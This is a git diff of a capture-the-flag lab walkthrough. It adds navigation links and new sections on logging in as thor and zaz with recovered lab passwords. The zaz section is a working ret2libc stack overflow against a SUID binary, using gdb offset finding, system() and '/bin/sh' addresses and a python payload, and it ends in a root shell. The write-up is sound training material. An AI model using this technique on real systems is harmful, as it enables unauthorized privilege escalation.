@@ -21,12 +21,14 @@
     + [Secret phase](#secret-phase)
     + [Finding thor ssh password](#finding-thor-ssh-password)
   * [SSH thor](#ssh-thor)
+  * [SSH zaz](#ssh-zaz)
 
 <small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>
 
 
 
 ## IP and Ports
+[Table of Contents](#table-of-contents)
 
 Obtaining IP address of the virtual machine, and it's open ports
 
@@ -108,6 +110,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds
 ```
 
 ## Web Path Scanner
+[Table of Contents](#table-of-contents)
 
 It exist an automated tool for `web path scanner` : [Dirsearch](https://github.com/maurosoria/dirsearch)
 
@@ -154,6 +157,8 @@ Task Completed
 ```
 
 ## Exploring the forum
+[Table of Contents](#table-of-contents)
+
 
 Accessing [https://192.168.1.7/forum/](https://192.168.1.7/forum/)
 
@@ -183,6 +188,8 @@ laurie@borntosec.net
 ```
 
 ## Reading lmezard emails
+[Table of Contents](#table-of-contents)
+
 
 Accessing [https://192.168.1.7/webmail/](https://192.168.1.7/webmail/)
 
@@ -203,6 +210,8 @@ Best regards.
 ```
 
 ## Exploiting phpmyadmin
+[Table of Contents](#table-of-contents)
+
 
 Accessing [https://192.168.1.7/phpmyadmin/index.php](https://192.168.1.7/phpmyadmin/index.php/)
 
@@ -284,6 +293,8 @@ nobody
 we will be able to use ftp !
 
 ## lmezard user
+[Table of Contents](#table-of-contents)
+
 
 With the previously discovered credentials:
 
@@ -349,6 +360,8 @@ echo -n  Iheartpwnage | shasum -a 256
 we can now connect to ssh !
 
 ## SSH laurie
+[Table of Contents](#table-of-contents)
+
 
 Connecting by ssh with the following credentials:
 ```sh
@@ -380,6 +393,8 @@ NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
 
 ### Phase 1
+[Table of Contents](#table-of-contents)
+
 
 The program is just comparing our input against `Public speaking is very easy.`
 
@@ -392,6 +407,8 @@ Phase 1 defused. How about the next one?
 ```
 
 ### Phase 2
+[Table of Contents](#table-of-contents)
+
 
 The program waits for the factorials of 1 to 6
 
@@ -401,6 +418,8 @@ That's number 2.  Keep going!
 ```
 
 ### Phase 3
+[Table of Contents](#table-of-contents)
+
 
 The program awaits for an int, then a char and finally another number.
 Having a look through a debugger we see that 3 inputs will match the hint in `README` and not make the bomb explode
@@ -419,6 +438,8 @@ Halfway there!
 ```
 
 ### Phase 4
+[Table of Contents](#table-of-contents)
+
 
 The program will calculate the umpteenth number of the Fibonacci sequence and compare it to `0x37`, or in decimal `55`.
 
@@ -437,6 +458,8 @@ So you got that one.  Try this one.
 if we input `9 austinpowers` it will later unlock a secret phase.
 
 ### Phase 5
+[Table of Contents](#table-of-contents)
+
 
 The program take as input a string:
  * Then takes each character value
@@ -467,6 +490,8 @@ Good work!  On to the next...
 ```
 
 ### Phase 6
+[Table of Contents](#table-of-contents)
+
 
 The program possess a linked list with value from 1 to 6, and will compare our input to them.
 
@@ -475,7 +500,7 @@ It also makes sure all numbers are different and less or equal than 6.
 We made a little script to bruteforce it which can be used this way:
 
 ```
-python3 phase_6.py ./bomb
+python3 scripts/phase_6.py ./bomb
 Input:  Public speaking is very easy.
 1 2 6 24 120 720
 1 b 214
@@ -493,6 +518,8 @@ Congratulations! You've defused the bomb!
 ```
 
 ### Secret phase
+[Table of Contents](#table-of-contents)
+
 
 It's optional, and of no use.
 The answer needs to be above 1000, and some other constrain, but after luckily trying `1001` as our first try we found it!
@@ -521,6 +548,8 @@ Congratulations! You've defused the bomb!
 
 
 ### Finding thor ssh password
+[Table of Contents](#table-of-contents)
+
 
 Here are all the different valid possibilites:
 
@@ -551,6 +580,117 @@ Going through slack/stackoverflow we found out that the password is messed up an
 Link to the relevant post on stackoverflow :
 [https://stackoverflow.com/c/42network/questions/664](https://stackoverflow.com/c/42network/questions/664)
 
-Finally the working password is : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+Finally, the working password is: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 ## SSH thor
+[Table of Contents](#table-of-contents)
+
+
+Connecting by ssh with the following credentials:
+
+```sh
+user: thor
+pass: Publicspeakingisveryeasy.126241207201b2149opekmq426135
+```
+
+we see a file named turtle in the home, which we download:
+
+```sh
+scp -r thor@192.168.1.7:~/turle .
+```
+
+We have created a script to interpret the file:
+
+```sh
+python3 scripts/draw.py turtle
+```
+
+We visually deduce the password: "SLASH"
+
+At the end of the file we can read:
+
+```
+Can you digest the message? :)
+```
+
+following the instruction:
+
+```sh
+echo -n SLASH | openssl dgst -md5
+(stdin)= 646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+## SSH zaz
+[Table of Contents](#table-of-contents)
+
+
+Connecting by ssh with the following credentials:
+```sh
+user: zaz
+pass: 646da671ca01bb5d84dbb5fb2238dc8e
+```
+
+We see an executable with suid/guid rights `exploit_me`
+
+```sh
+scp -r zaz@192.168.1.7:~/exploit_me .
+```
+
+```sh
+gdb exploit_me
+```
+
+```
+pattern create 200'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+```
+
+```
+gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+```
+
+```
+gdb-peda$ pattern search
+Registers contain pattern buffer:
+ECX+52 found at offset: 69
+EDX+52 found at offset: 69
+EBP+0 found at offset: 136
+EIP+0 found at offset: 140
+```
+
+```
+gdb-peda$ b main
+Breakpoint 1 at 0x80483f7
+gdb-peda$ r
+
+```
+
+launching gdb again without peda:
+
+```
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+```
+
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+
+We now have all needed informations:
+
+```sh
+./exploit_me `python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1]) + 'OSEF' + '\xb7\xf8\xcc\x58'[::-1]"`
+# whoami
+root
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+#
+```
